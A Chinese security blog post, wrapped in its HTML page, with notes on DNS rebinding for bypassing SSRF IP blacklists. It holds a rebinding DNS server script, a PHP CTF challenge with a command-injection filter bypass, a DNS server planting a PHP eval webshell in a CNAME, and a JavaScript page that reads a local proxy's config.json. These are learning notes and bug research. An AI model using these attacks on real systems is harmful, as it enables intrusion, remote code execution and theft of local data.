@@ -1,0 +1,540 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>DNS Rebinding | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="最后的链接是关于dns rebinding的文章，这里主要做一个笔记：
+先盗用ricterz.me的博客一个图
+在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。
+
+获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。
+比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问
+
+使用DNS Rebinding的会有这样的攻击效果:
+
+获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面
+放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。
+
+DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。
+所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。
+根据goychou大神的脚本，测试以下步骤：
+
+添加一个A记录，域名是ns.xyz.pw，指向服务器A
+再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="DNS Rebinding"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> DNS Rebinding</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
+<p>先盗用ricterz.me的博客一个图<br><img src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
+<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
+<ol>
+<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
+<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
+</ol>
+<p>使用DNS Rebinding的会有这样的攻击效果:</p>
+<ol>
+<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
+<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
+</ol>
+<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
+<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
+<p>根据goychou大神的脚本，测试以下步骤：</p>
+<ul>
+<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
+<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
+</ul>
+<p>此时在A服务器上运行脚本:</p>
+<pre class="line-numbers language-none"><code class="language-none">from twisted.internet import reactor, defer
+from twisted.names import client, dns, error, server
+record&#x3D;&#123;&#125;
+class DynamicResolver(object):
+    def _doDynamicResponse(self, query):
+        name &#x3D; query.name.name
+        if name not in record or record[name]&lt;1:
+            ip &#x3D; &quot;A IP&quot;
+        else:
+            ip &#x3D; &quot;127.0.0.1&quot;
+        if name not in record:
+            record[name] &#x3D; 0
+        record[name] +&#x3D; 1
+        print name + &quot; &#x3D;&#x3D;&#x3D;&gt; &quot; + ip
+        answer &#x3D; dns.RRHeader(
+            name &#x3D; name,
+            type &#x3D; dns.A,
+            cls &#x3D; dns.IN,
+            ttl &#x3D; 0,
+            payload &#x3D; dns.Record_A(address &#x3D; b&#39;%s&#39; % ip, ttl&#x3D;0)
+        )
+        answers &#x3D; [answer]
+        authority &#x3D; []
+        additional &#x3D; []
+        return answers, authority, additional
+    def query(self, query, timeout&#x3D;None):
+        return defer.succeed(self._doDynamicResponse(query))
+def main():
+    factory &#x3D; server.DNSServerFactory(
+        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]
+    )
+    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)
+    reactor.listenUDP(53, protocol)
+    reactor.run()
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    raise SystemExit(main())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时，在Linux上面运行：</p>
+<pre class="line-numbers language-none"><code class="language-none">dig @8.8.8.8 rebind.xyz.pw
+返回结果是A主机的IP
+
+再次运行上面的命令:
+dig @8.8.8.8 rebind.xyz.pw
+返回结果是127.0.0.1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>###TIPS<br>以下是从joychou大神博客来的：<br>在Linux，默认不会进行DNS缓存，除非运行nscd，dnsmaq等。</p>
+<p>另外一个是Ph牛出的与dns有关的题目:</p>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;?php
+header(&#39;Content-Type: text&#x2F;plain&#39;);
+$ip &#x3D; $_GET[&#39;ip&#39;]??exit;
+duita($ip);
+$ip &#x3D; escapeshellcmd($ip);
+$ip &#x3D; str_replace(&#39;\&gt;&#39;, &#39;&gt;&#39;, $ip);
+$ip &#x3D; str_replace(&#39;\&lt;&#39;, &#39;&lt;&#39;, $ip);
+$cmd &#x3D; sprintf(&#39;ping -c 2 %s&#39;, $ip);
+echo shell_exec($cmd);
+ 
+function duita($ip)
+&#123;
+    if(strpbrk($ip, &quot;&amp;;&#96;|*?()$\\\x00&quot;) !&#x3D;&#x3D; false) &#123;
+        exit(&#39;WAF&#39;);
+    &#125;
+    if(stripos($ip, &#39;.php&#39;) !&#x3D;&#x3D; false) &#123;
+        exit(&#39;WAF&#39;);
+    &#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<ul>
+<li>没有过滤<code>&gt;</code></li>
+<li><code>&quot;</code> <code>&#39;</code>在成对的情况下escapeshellcmd是不会过滤的，所以<code>.p&#39;&#39;php</code>绕过waf</li>
+</ul>
+<p>搭建一个dns服务器:</p>
+<pre class="line-numbers language-none"><code class="language-none">import datetime
+import sys
+import time
+import threading
+import traceback
+import socketserver
+from dnslib import *
+
+TTL &#x3D; 300
+def dns_response(data):
+    request &#x3D; DNSRecord.parse(data)
+    reply &#x3D; DNSRecord(DNSHeader(id&#x3D;request.header.id, qr&#x3D;1, aa&#x3D;1, ra&#x3D;1), q&#x3D;request.q)
+    qname &#x3D; request.q.qname
+    qn &#x3D; str(qname)
+    qtype &#x3D; request.q.qtype
+    qt &#x3D; QTYPE[qtype]
+    if qn.startswith(&#39;rebind.xyz.pw&#39;):
+        rdata &#x3D; CNAME(&#39;&lt;?&#x3D;eval($_POST[1]?&gt;.xyz.pw&#39;)
+        reply.add_answer(RR(rname&#x3D;qname, rtype&#x3D;5, rclass&#x3D;1, ttl&#x3D;TTL, rdata&#x3D;rdata))
+    else:
+        rdata &#x3D; A(&#39;172.96.210.188&#39;)
+        reply.add_answer(RR(rname&#x3D;qname, rtype&#x3D;1, rclass&#x3D;1, ttl&#x3D;TTL, rdata&#x3D;rdata))
+    print(&quot;----Replay:\n&quot;, reply)
+    return reply.pack()
+
+class BaseRequestHandler(socketserver.BaseRequestHandler):
+    def get_data(self):
+        raise NotImplementedError
+    def send_data(self, data):
+        raise NotImplementedError
+    def handle(self):
+        now &#x3D; datetime.datetime.utcnow().strftime(&#39;%Y-%m-%d %H:%M:%S:%f&#39;)
+        try:
+            data &#x3D; self.get_data()
+            self.send_data(dns_response(data))
+        except Exception:
+            traceback.print_exc(file&#x3D;sys.stderr)
+
+class TCPRequestHandler(BaseRequestHandler):
+    def get_data(self):
+        data &#x3D; self.request.recv(8192).strip()
+        sz &#x3D; int(data[:2].encode(&#39;hex&#39;), 16)
+        if sz &lt; len(data) -2:
+            raise Exception(&quot;Wrong size of TCP Packet&quot;)
+        elif sz &gt; len(data) -2:
+            raise Exception(&quot;Too big TCP Packet&quot;)
+        return data[2:]
+
+    def send_data(self, data):
+        sz &#x3D; hex(len(data))[2:].zfill(4).decode(&#39;hex&#39;)
+        return self.request.sendall(sz + data)
+
+class UDPRequestHandler(BaseRequestHandler):
+    def get_data(self):
+        return self.request[0].strip()
+    def send_data(self, data):
+        return self.request[1].sendto(data, self.client_address)
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    print(&quot;Starting nameserver&quot;)
+    servers &#x3D; [
+        socketserver.ThreadingUDPServer((&#39;&#39;,53),UDPRequestHandler),
+        socketserver.ThreadingTCPServer((&#39;&#39;, 53),TCPRequestHandler),
+    ]
+    for s in servers:
+        thread &#x3D; threading.Thread(target&#x3D;s.serve_forever)
+        thread.daemon &#x3D; True
+        thread.start()
+        print(&quot;%s server loop running in thread: %s&quot; % (s.RequestHandlerClass.__name__[:3], thread.name))
+
+    try:
+        while 1:
+            time.sleep(1)
+            sys.stderr.flush()
+            sys.stdout.flush()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        for s in servers:
+            s.shutdown()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样：</p>
+<pre class="line-numbers language-none"><code class="language-none">dig rebind.xyz.pw的时候其中的cname是shell，但是本地ping的时候出现uknow host的错误
+ dig rebind.xyz.pw
+
+; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; rebind.xyz.pw
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56051
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;rebind.xyz.pw.			IN	A
+
+;; ANSWER SECTION:
+rebind.xyz.pw.		300	IN	CNAME	&lt;?&#x3D;eval\(\$_POST[1]?&gt;.xyz.pw.
+
+;; Query time: 1266 msec
+;; SERVER: 202.101.172.35#53(202.101.172.35)
+;; WHEN: Wed Dec  6 15:52:56 2017
+;; MSG SIZE  rcvd: 66
+
+
+复现失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>======<br>2019/06/05更新:</p>
+<p>这几天上网只能用v2rayX，看到在8070端口起了一个http服务，想起来微信爆出来的可以利用DNS Rebinding获取微信号的内容，看了下本地的服务跟微信插件的类似，甚至用的都是GCDWebServer，开始本地捣鼓一下能不能获取到配置文件。最终测试成功，但是得在页面等1分多钟，因为会有dns解析的缓存。</p>
+<p>测试代码搬的: <a target="_blank" rel="noopener" href="https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html">https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html</a></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DCTYPE html&gt;
+    &lt;html lang&#x3D;&quot;en&quot;&gt;
+    &lt;head&gt;
+        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+        &lt;title&gt;Rebind Test&lt;&#x2F;title&gt;
+    &lt;&#x2F;head&gt;
+    &lt;body&gt;
+        &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;upcdn.b0.upaiyun.com&#x2F;libs&#x2F;jquery&#x2F;jquery-2.0.3.min.js&quot;&gt;&lt;&#x2F;script&gt;
+        &lt;script&gt;
+        function GetUin()&#123;
+	    console.log(&quot;Testing&quot;);
+            $.ajax(&#123;
+            url: &quot;http:&#x2F;&#x2F;rebind.xyz.xyz:8070&#x2F;config.json&quot;,
+            type: &quot;GET&quot;,
+            dataType: &quot;text&quot;,
+            success: function(data)&#123;
+                alert(data);
+		console.log(data);
+                &#125;
+            &#125;);
+        &#125;
+        setTimeout(&quot;GetUin()&quot;, 5000);
+	setTimeout(&quot;GetUin()&quot;, 7000);
+	setTimeout(&quot;GetUin()&quot;, 8000);
+	setTimeout(&quot;GetUin()&quot;, 30000);
+        setTimeout(&quot;GetUin()&quot;, 60000);
+        setTimeout(&quot;GetUin()&quot;, 90000);
+        &lt;&#x2F;script&gt;
+    &lt;&#x2F;body&gt;
+    &lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>坑:</p>
+<p>昨天测了大半天，中间只成功了一次，大概是踩狗屎了。<br>chrome下做的测试，做完清缓存:</p>
+<ol>
+<li>chrome://net-internals/#dns 和 chrome://net-internals/#sockets</li>
+<li>chrome的清理缓存文件，历史纪录什么的</li>
+<li>dscacheutil -flushcache;sudo killall -HUP mDNSResponder</li>
+</ol>
+<p>rebind.xyz.xyz的ttl我设置了为2分钟，找了半天没有设置为0的dns解析服务。最后测试成功，撒花，怪不得微信插件那个要等1分多钟，测完给作者提了个bug，貌似是注册这么久第一次给人提bug。</p>
+<p>这种本地起web服务的很容易受到攻击，就我查到的有:</p>
+<ol>
+<li>visual studio远程命令执行</li>
+<li>暴雪的一款游戏什么的</li>
+<li>QQ的获取QQ号码和微信插件获取好友列表</li>
+</ol>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html">https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction">https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction</a></li>
+<li><a target="_blank" rel="noopener" href="https://virusdefender.net/index.php/archives/685/">https://virusdefender.net/index.php/archives/685/</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/12/06/dns-rebinding.html" class="leancloud-visitors view" data-flag-title="DNS Rebinding">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/12/11/producer-consumer.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/12/05/redis-crontab.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-12-06 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
